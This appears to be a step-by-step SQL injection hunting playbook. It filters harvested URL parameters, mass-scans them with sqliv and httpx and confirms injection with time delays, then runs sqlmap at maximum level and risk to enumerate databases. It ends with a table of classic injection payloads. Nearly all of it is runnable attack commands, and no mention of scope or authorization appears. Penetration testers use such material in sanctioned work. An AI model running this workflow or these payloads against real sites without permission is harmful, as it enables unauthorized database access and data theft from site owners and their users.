SQL Injection Testing

Complete SQL injection methodology from parameter discovery to confirmation.

Input Requirements

Required: parameter.txt (combined output from ParamSpider / Arjun / FFUF)

SQL Injection Workflow

Step 1: Parameter Cleaning (Mandatory)

cat parameter.txt | sort -u > params_unique.txt
grep "=" params_unique.txt > params_ready.txt

Step 2: SQL-Interesting Parameter Filter

grep -Ei "id=|uid=|pid=|cat=|page=|item=|product=|order=|sort=|type=|ref=|search=|query=|name=" params_ready.txt > sqli_candidates.txt

Step 3: Fast Mass Discovery (Low Impact)

Using sqliv

python3 sqliv.py -t sqli_candidates.txt

Output: sqli_mass_hits.txt

Purpose: Remove dead / boring endpoints

Step 4: Basic Error-Based Check

sed "s/=/='/" sqli_mass_hits.txt > sqli_quote_test.txt
httpx -l sqli_quote_test.txt -silent -fr -o sqli_error_responses.txt

Step 5: Extract Real Suspects

grep -Ei "SQL|syntax|mysql|ORA|PDO|SQLite|Postgre" sqli_error_responses.txt > sqli_suspects.txt

Step 6: Time-Based Confirmation (Most Reliable)

Using Blinder

python3 blinder.py -u "URL" -p param --sleep 5

Delay ≥ 5s = CONFIRMED SQLi

Save: sqli_confirmed.txt

Step 7: Final Proof (SQLMap Only at the End)

Single Target

sqlmap -u "URL" --batch --level=5 --risk=3 --dbs

Multiple Targets

sqlmap -m sqli_confirmed.txt --batch --level=5 --risk=3

NoSQL Check (MongoDB)

Using NoSQLMap

python3 nosqlmap.py

Note: Only if the app uses MongoDB

Common SQLi Payloads

Type Payload
Boolean Based ' OR '1'='1
Comment Based ' OR 1=1--
UNION Based ' UNION SELECT NULL--
Time-Based ' OR SLEEP(5)--
